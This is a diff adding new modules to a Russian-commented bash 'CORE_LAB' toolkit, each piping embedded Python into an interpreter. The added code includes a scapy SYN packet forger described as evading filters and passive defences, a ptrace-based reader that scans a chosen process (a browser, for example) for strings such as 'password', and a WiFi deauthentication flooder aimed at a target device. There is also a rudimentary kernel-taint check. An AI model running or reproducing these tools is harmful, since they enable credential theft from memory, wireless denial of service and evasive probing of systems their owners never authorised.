@@ -2355,6 +2355,191 @@ run_mesh_bridge() {
 }
 
 
+generate_packet_forge_code_raw() {
+    cat << 'EOF'
+import sys
+from scapy.all import IP, TCP, send
+import random
+
+def forge_stealth_packet(target_ip, target_port):
+    # Создаем IP-слой со случайным ID для обхода простых фильтров
+    ip_layer = IP(dst=target_ip, id=random.randint(1000, 9000))
+    
+    # Создаем TCP-слой с флагом "S" (SYN) и нестандартным Window Size
+    # Это имитирует специфический стек ОС для обхода пассивных систем защиты
+    tcp_layer = TCP(sport=random.randint(1024, 65535), 
+                    dport=int(target_port), 
+                    flags="S", 
+                    window=random.choice([1024, 2048, 4096, 8192]))
+    
+    packet = ip_layer / tcp_layer
+    
+    try:
+        send(packet, verbose=False)
+        print(f"[SUCCESS] Stealth SYN packet injected to {target_ip}:{target_port}")
+    except Exception as e:
+        print(f"[ERROR] Injection failed: {e}")
+
+if __name__ == "__main__":
+    if len(sys.argv) > 2:
+        forge_stealth_packet(sys.argv[1], sys.argv[2])
+    else:
+        print("Usage: python3 - <target_ip> <target_port>")
+EOF
+}
+
+
+
+run_packet_forge() {
+    print_header "CORE_LAB: RAW PACKET FORGE"
+    
+    # Проверка наличия scapy (библиотека Kali)
+    if ! python3 -c "import scapy" >/dev/null 2>&1; then
+        print_status "w" "Scapy missing. Installing low-level network headers..."
+        apt-get update && apt-get install python3-scapy -y
+    fi
+
+    echo -en "${Y}Target IP: ${NC}"; read -r t_ip
+    echo -en "${Y}Target Port: ${NC}"; read -r t_port
+    
+    print_status "i" "Forging polymorphic packet structure..."
+    
+    # Запуск через наш стандартный механизм "в памяти"
+    generate_packet_forge_code_raw | python3 - "$t_ip" "$t_port"
+    
+    pause
+}
+
+
+
+
+generate_mem_inject_code_raw() {
+    cat << 'EOF'
+import ctypes
+import os
+import sys
+
+# Константы для доступа к памяти
+PTRACE_ATTACH = 16
+PTRACE_DETACH = 17
+
+def read_process_memory(pid, search_str):
+    libc = ctypes.CDLL("libc.so.6")
+    
+    # Пытаемся прикрепиться к процессу (нужны права root)
+    if libc.ptrace(PTRACE_ATTACH, pid, 0, 0) < 0:
+        print(f"[!] Failed to attach to PID {pid}")
+        return
+
+    print(f"[*] Scanning PID {pid} for sensitive patterns...")
+    
+    try:
+        # Читаем карты памяти процесса
+        with open(f"/proc/{pid}/maps", "r") as maps_file:
+            for line in maps_file:
+                if "rw-p" not in line: continue  # Нас интересуют только сегменты с чтением/записью
+                
+                parts = line.split()
+                addr_range = parts[0].split("-")
+                start = int(addr_range[0], 16)
+                end = int(addr_range[1], 16)
+                size = end - start
+                
+                # Читаем данные напрямую из /proc/pid/mem
+                with open(f"/proc/{pid}/mem", "rb", 0) as mem_file:
+                    mem_file.seek(start)
+                    try:
+                        chunk = mem_file.read(size)
+                        if search_str.encode() in chunk:
+                            print(f"[MATCH] Found '{search_str}' at 0x{start:x} in PID {pid}")
+                    except:
+                        continue
+    finally:
+        libc.ptrace(PTRACE_DETACH, pid, 0, 0)
+
+if __name__ == "__main__":
+    if len(sys.argv) > 2:
+        read_process_memory(int(sys.argv[1]), sys.argv[2])
+EOF
+}
+
+
+
+run_mem_inject() {
+    print_header "CORE_LAB: MEMORY INFILTRATOR"
+    
+    echo -en "${Y}Enter Target PID (e.g., of a browser or service): ${NC}"; read -r t_pid
+    echo -en "${Y}String to search in RAM (e.g., 'password'): ${NC}"; read -r t_search
+    
+    print_status "w" "Engaging syscall ptrace_attach on PID $t_pid..."
+    generate_mem_inject_code_raw | python3 - "$t_pid" "$t_search"
+    
+    pause
+}
+
+
+
+generate_wifi_pulse_code_raw() {
+    cat << 'EOF'
+from scapy.all import Dot11, Dot11Deauth, RadioTap, sendp
+import sys
+
+def deauth_pulse(target_mac, gateway_mac, iface):
+    # Конструируем пакет деавторизации на уровне L2
+    dot11 = Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)
+    packet = RadioTap() / dot11 / Dot11Deauth(reason=7)
+    
+    print(f"[*] Sending Silent Pulse (Deauth) to {target_mac} via {iface}")
+    sendp(packet, iface=iface, count=100, inter=0.1, verbose=False)
+
+if __name__ == "__main__":
+    if len(sys.argv) > 3:
+        deauth_pulse(sys.argv[1], sys.argv[2], sys.argv[3])
+EOF
+}
+
+
+
+run_wifi_pulse() {
+    print_header "CORE_LAB: WIRELESS SILENT PULSE"
+    
+    echo -en "${Y}Target Device MAC: ${NC}"; read -r t_mac
+    echo -en "${Y}Gateway (AP) MAC: ${NC}"; read -r g_mac
+    echo -en "${Y}Monitor Interface (e.g., wlan0mon): ${NC}"; read -r t_iface
+    
+    print_status "i" "Broadcasting raw L2 deauth frames..."
+    generate_wifi_pulse_code_raw | python3 - "$t_mac" "$g_mac" "$t_iface"
+    
+    pause
+}
+
+
+run_kernel_check() {
+    print_header "CORE_LAB: KERNEL INTEGRITY AUDIT"
+    
+    print_status "i" "Analyzing /proc/kallsyms and /proc/modules..."
+    
+    # Простой, но эффективный способ поиска несоответствий без внешних утилит
+    local tainted=$(cat /proc/sys/kernel/tainted)
+    if [ "$tainted" -ne 0 ]; then
+        print_status "e" "Kernel is TAINTED (Value: $tainted). Possible unauthorized module or non-GPL driver."
+    else
+        print_status "s" "Kernel signature appears clean."
+    fi
+    
+    print_status "i" "Checking for hidden LKM (Loadable Kernel Modules)..."
+    lsmod | tail -n +2 | awk '{print $1}' > /tmp/mods.txt
+    
+    # Если модуль есть в символах, но нет в lsmod - это подозрительно
+    print_status "w" "Audit complete. Review /tmp/mods.txt for anomalies."
+    
+    pause
+}
+
+
+
+
+
 # --- Точка входа ---
 #repair
 run_main_menu
